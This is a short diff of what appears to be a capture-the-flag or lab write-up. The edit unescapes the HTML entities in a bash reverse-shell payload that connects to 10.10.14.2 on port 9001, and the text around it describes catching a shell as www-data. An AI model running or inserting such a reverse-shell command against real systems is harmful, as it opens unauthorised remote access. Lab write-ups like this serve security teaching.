@@ -93,7 +93,7 @@ I run the command &quot;whoami&quot; and it returns www-data. We know for sure w
 
 Now we will try a reverse shell payload.
 
-Payload: bash -c &#39;bash -i \&gt;&amp; /dev/tcp/10.10.14.2/9001 0\&gt;&amp;1&#39;
+Payload: bash -c "bash -i >& /dev/tcp/10.10.14.2/9001 0>&1"
 
 I set up a listener on port 9001, click send and we got a shell as www-data.
 
